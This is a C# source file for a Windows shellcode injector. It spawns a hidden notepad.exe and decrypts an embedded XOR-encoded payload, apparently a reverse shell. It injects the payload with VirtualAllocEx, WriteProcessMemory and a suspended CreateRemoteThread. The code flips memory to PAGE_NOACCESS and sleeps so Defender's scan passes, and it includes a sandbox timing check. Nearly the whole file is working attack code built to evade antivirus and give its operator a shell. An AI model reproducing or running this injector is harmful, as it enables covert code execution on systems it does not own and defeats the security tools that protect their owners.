/*	REMOTE_THREAD_SUSPENDED PROCESS INJECTION
description: |
	Injects shellcode into a newly spawned remote process and flips memory protection to PAGE_NOACCESS. 
	After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
	Thread execution via ResumeThread.
key win32 API calls:
  - kernel32.dll:
    1: 'OpenProcess'
    2: 'VirtualAllocEx (PAGE_EXECUTE_READ_WRITE)'
    3: 'WriteProcessMemory'
    4: 'VirtualProtectEx (PAGE_NO_ACCESS)'
    5: 'CreateRemoteThread (CREATE_SUSPENDED)'
    6: 'ResumeThread'
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace RTSProcessInjection
{
    class Program
    {
        public const uint PAGE_EXECUTE_READ_WRITE  = 0x40;
		public const uint PAGE_NO_ACCESS = 0x01;
		
		[DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
		
		private static byte[] xor(byte[] cipher, byte[] key)
		{
			byte[] xored = new byte[cipher.Length];

			for (int i = 0; i < cipher.Length; i++)
			{
				xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
			}

			return xored;
		}
		
        static void Main(string[] args)
        {
			Console.WriteLine("[+] Delay of three seconds for scan bypass check");

			DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                return;
            }
			
			IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;
            
			Console.WriteLine("[+] Opening notepad.exe in the background");

			Process p = new Process();
			p.StartInfo = new ProcessStartInfo("notepad.exe");
			p.StartInfo.WorkingDirectory = @"C:\Windows\System32\";		
			p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			p.Start();
			
			
            int pid = Process.GetProcessesByName("notepad")[0].Id;

            Console.WriteLine("[+] OpenProcess with PID {0}.", new string[] { pid.ToString() });

            hProcess = OpenProcess(0x001F0FFF, false, pid);


			string key = "ARICAHACKON";

			// This shellcode byte is the encrypted output from encryptor.exe
			byte[] xorshellcode = new byte[511] {0xbd, 0x1a, 0xca, 0xa7, 0xb1, 0xa0, 0x8d, 0x43, 0x4b, 0x4f, 0x0f, 0x10, 0x13, 0x19, 0x11, 0x09, 0x79, 0x93, 0x26, 0x03, 0xc4, 0x1c, 0x21, 0x1a, 0xc2, 0x11, 0x59, 0x00, 0xca, 0x11, 0x6b, 0x1e, 0x18, 0x0c, 0x63, 0x80, 0x0b, 0xca, 0x3a, 0x11, 0x0b, 0x44, 0xf8, 0x04, 0x0b, 0x1a, 0x78, 0x83, 0xed, 0x74, 0x20, 0x3f, 0x49, 0x63, 0x6e, 0x00, 0x93, 0x80, 0x4e, 0x00, 0x49, 0x80, 0xa1, 0xa6, 0x1d, 0x06, 0xca, 0x00, 0x69, 0x02, 0x10, 0xc3, 0x03, 0x7f, 0x03, 0x4e, 0x9e, 0x27, 0xd3, 0x31, 0x5b, 0x4a, 0x4a, 0x4e, 0xc6, 0x39, 0x4f, 0x4e, 0x41, 0xd9, 0xc9, 0xcb, 0x41, 0x48, 0x41, 0x0b, 0xce, 0x8f, 0x3a, 0x26, 0x1a, 0x48, 0x93, 0x05, 0xc3, 0x01, 0x63, 0x02, 0x4e, 0x9e, 0xca, 0x1a, 0x51, 0x13, 0xa2, 0x1e, 0x09, 0xbc, 0x82, 0x0e, 0xc5, 0x75, 0xda, 0x04, 0x72, 0x88, 0x00, 0x40, 0x95, 0x03, 0x7e, 0x8e, 0xed, 0x13, 0x88, 0x8a, 0x4c, 0x09, 0x40, 0x82, 0x73, 0xaf, 0x3b, 0xb0, 0x1e, 0x4a, 0x0f, 0x65, 0x40, 0x04, 0x7a, 0x9a, 0x3a, 0x96, 0x19, 0x16, 0xc2, 0x03, 0x65, 0x01, 0x40, 0x93, 0x2d, 0x0e, 0xc5, 0x4d, 0x1a, 0x0d, 0xc8, 0x01, 0x54, 0x08, 0x42, 0x9b, 0x0e, 0xc5, 0x45, 0xda, 0x01, 0x42, 0x91, 0x09, 0x19, 0x02, 0x13, 0x11, 0x17, 0x1b, 0x13, 0x11, 0x02, 0x18, 0x09, 0x1b, 0x0b, 0xc8, 0xa3, 0x6e, 0x00, 0x00, 0xb6, 0xa3, 0x19, 0x09, 0x18, 0x19, 0x03, 0xc4, 0x5c, 0xa8, 0x19, 0xb6, 0xbc, 0xbe, 0x15, 0x08, 0xfd, 0x3c, 0x3c, 0x7c, 0x1e, 0x61, 0x7b, 0x43, 0x41, 0x09, 0x17, 0x0a, 0xc2, 0xa9, 0x06, 0xc0, 0xbe, 0xe9, 0x42, 0x41, 0x48, 0x08, 0xca, 0xae, 0x06, 0xf2, 0x43, 0x52, 0x56, 0xd3, 0x4b, 0x49, 0x40, 0x4c, 0x0a, 0x1b, 0x07, 0xc8, 0xb6, 0x05, 0xca, 0xb0, 0x09, 0xfb, 0x0f, 0x3c, 0x69, 0x49, 0xbe, 0x87, 0x05, 0xca, 0xab, 0x20, 0x40, 0x42, 0x4b, 0x4f, 0x17, 0x00, 0xe8, 0x60, 0xc3, 0x2a, 0x48, 0xbe, 0x96, 0x21, 0x45, 0x0f, 0x1f, 0x02, 0x19, 0x0e, 0x70, 0x81, 0x0c, 0x72, 0x8b, 0x07, 0xb1, 0x81, 0x1a, 0xc0, 0x81, 0x09, 0xb7, 0x81, 0x0b, 0xc2, 0x8e, 0x0f, 0xfb, 0xb8, 0x46, 0x9c, 0xa1, 0xb7, 0x94, 0x0b, 0xc2, 0x88, 0x24, 0x51, 0x13, 0x11, 0x0f, 0xc8, 0xaa, 0x09, 0xca, 0xb2, 0x0e, 0xf4, 0xd8, 0xf7, 0x3d, 0x22, 0xbe, 0x9d, 0xc4, 0x83, 0x3f, 0x45, 0x07, 0xbe, 0x9c, 0x3c, 0xa6, 0xa9, 0xdb, 0x41, 0x43, 0x4b, 0x07, 0xcd, 0xad, 0x42, 0x01, 0xca, 0xa3, 0x05, 0x70, 0x8a, 0x21, 0x4b, 0x0f, 0x19, 0x1a, 0xc0, 0xba, 0x00, 0xf2, 0x43, 0x9a, 0x83, 0x10, 0xb1, 0x94, 0xd1, 0xb1, 0x43, 0x3f, 0x1d, 0x09, 0xc0, 0x8f, 0x6f, 0x10, 0xc8, 0xa4, 0x23, 0x03, 0x00, 0x11, 0x29, 0x43, 0x5b, 0x4f, 0x4e, 0x00, 0x0a, 0x01, 0xca, 0xb3, 0x00, 0x70, 0x8a, 0x0a, 0xf5, 0x16, 0xe5, 0x01, 0xac, 0xbc, 0x94, 0x00, 0xc8, 0x80, 0x02, 0xc6, 0x89, 0x0c, 0x63, 0x80, 0x0a, 0xc8, 0xb8, 0x09, 0xca, 0x91, 0x07, 0xc7, 0xb8, 0x13, 0xf3, 0x41, 0x98, 0x80, 0x1e, 0xbc, 0x9e, 0xcc, 0xb6, 0x41, 0x2f, 0x61, 0x1b, 0x00, 0x1f, 0x18, 0x2b, 0x4b, 0x0f, 0x4e, 0x41, 0x13, 0x11, 0x29, 0x41, 0x12, 0x00, 0xf9, 0x40, 0x60, 0x41, 0x71, 0xad, 0x9c, 0x14, 0x18, 0x09, 0xfb, 0x36, 0x25, 0x02, 0x2f, 0xbe, 0x87, 0x00, 0xbc, 0x8f, 0xa1, 0x7d, 0xbc, 0xb4, 0xb0, 0x06, 0x40, 0x91, 0x01, 0x6a, 0x87, 0x00, 0xc4, 0xb5, 0x3e, 0xfb, 0x0f, 0xbe, 0xb5, 0x11, 0x29, 0x41, 0x11, 0xfa, 0xa3, 0x56, 0x65, 0x44, 0x00, 0xdb, 0x93, 0xbc, 0x94};

			byte[] shellcode;
			shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));


            Console.WriteLine("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { hProcess.ToString("X") });
            // Sets a variable that references the memory to be allocated to the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint) shellcode.Length, 0x3000, PAGE_EXECUTE_READ_WRITE);

            Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { addr.ToString("X") });
            // Write shellcode to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_NO_ACCESS) on 0x{0}", new string[] { addr.ToString("X") });
			// Sets the memory space from EXECUTE_READ_WRITE to PAGE_NOACCESS 
            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_NO_ACCESS, out uint lpflOldProtect);

            Console.WriteLine("[+] CreateRemoteThread (suspended) to 0x{0}", new string[] { addr.ToString("X") });
            // Create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            Console.WriteLine("[+] Sleeping as Defender scans the remote process", null);
            // Sleep for 10 seconds so Defender can scan the remote process
            System.Threading.Thread.Sleep(10000);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { addr.ToString("X") });
            // Change memory protection backto PAGE_EXECUTE_READ_WRITE.
            VirtualProtectEx(hProcess,addr, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ_WRITE, out lpflOldProtect);

            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { hThread.ToString("X") });
            // Resume the suspended notepad.exe thread
            ResumeThread(hThread);
			
			Console.WriteLine("[+] Enjoy your shell from notepad");
			//This is for debug. You can comment the below line if you do not need to read all the console messages
			System.Threading.Thread.Sleep(3000);
        }
    }
}
